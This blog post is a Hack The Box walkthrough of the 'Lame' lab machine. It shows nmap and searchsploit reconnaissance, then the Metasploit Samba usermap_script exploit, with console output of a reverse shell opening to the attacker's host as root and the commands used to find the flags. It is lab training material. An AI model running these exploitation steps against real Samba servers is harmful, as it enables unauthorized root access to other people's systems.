---
layout: post
title: HackTheBox - Lame
---


Lame is a beginner friendly machine from Hack The Box. It is directly exploitable with the Metasploit module **exploit/multi/samba/usermap_script**. This exploit not only opens a shell session, but it does it as root. From there, it's just a matter of getting the flags.

Pretty straightforward, let's dive in.



## Attack Narrative



### Active Information Gathering

I start with a simple port scan with default scripts.

```
root@kali:~/htb/boxes/Lame# nmap -Pn -n --open -sC -oA nmap-scan 10.10.10.3
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-18 18:37 -03
Nmap scan report for 10.10.10.3
Host is up (0.25s latency).
Not shown: 996 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
21/tcp  open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
Host script results:
|_clock-skew: mean: -2d22h05m42s, deviation: 0s, median: -2d22h05m42s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-08-15T13:32:20-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 128.91 seconds
```

SMB services are usually prone to multiple vulnerabilities, so this helps me prioritize:

- First, I'll check for vulnerabilities in SMB. I have the version: `Samba 3.0.20-Debian`.
- Second in the list is obviously FTP. I can log in anonymously, and I also have the version of the application: `vsFTPd 2.3.4`.
- Lastly, I'll check for ssh on port 22, while waiting for a full scan. 



### Vulnerability Scanning

I start scanning for vulnerabilities in the services by using plain Google and a utility called `searchsploit`.

This is what I find in `searchsploit`:

```
root@kali:~/htb/boxes/Lame# searchsploit Samba 3.0.20
... SNIP ...
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
Samba < 3.0.20 - Remote Heap Overflow
... SNIP ...
Shellcodes: No Result
root@kali:~/htb/boxes/Lame# 
```

I'm looking for something like the first one. The target machine seems to be vulnerable, given the fact that it's a Linux machine running `Samba 3.0.20`. 



### Exploitation - w00t, w00t!

According to rapid7, the module for Samba "username map script" Command Execution has *excellent* reliabilty. This is what I'm looking for: in case the exploit fails it won't crash the machine. 

Time to fire `msfconsole` and load the module.

```
msf > use exploit/multi/samba/usermap_script 
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3

```



Everything seems to be in place, but it's always good to double check:

```
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  10.10.10.3       yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```



And, I run `exploit` to execute it.

```
msf exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.14:443 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo HzmgB07WVuZ8kBhR;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\nHzmgB07WVuZ8kBhR\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.14:443 -> 10.10.10.3:44289) at 2018-12-03 19:08:11 -0300

id
uid=0(root) gid=0(root)
hostname
lame
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:bf:36:b8 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.3/24 brd 10.10.10.255 scope global eth0
    inet6 dead:beef::250:56ff:febf:36b8/64 scope global dynamic 
       valid_lft 86371sec preferred_lft 14371sec
    inet6 fe80::250:56ff:febf:36b8/64 scope link 
       valid_lft forever preferred_lft forever

```



Success! I'm in, and as root. Now getting the flags is trivial.

```
find / -name user.txt 2>/dev/null
/home/makis/user.txt
find / -name root.txt 2>/dev/null
/root/root.txt
```



And the result, which I reveal partially.

```
cat /home/makis/user.txt
---------------0225ea00acd2e84c5
cat /root/root.txt
---------------09e45721348a4e9df
```



## Conclusion

Very easy to pwn box, ideal for beginners and to learn to use Metasploit. It was fun, and I wonder what other ways one could access it. 

As always, thanks for reading and keep hacking!



###### References

[Rapid7](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)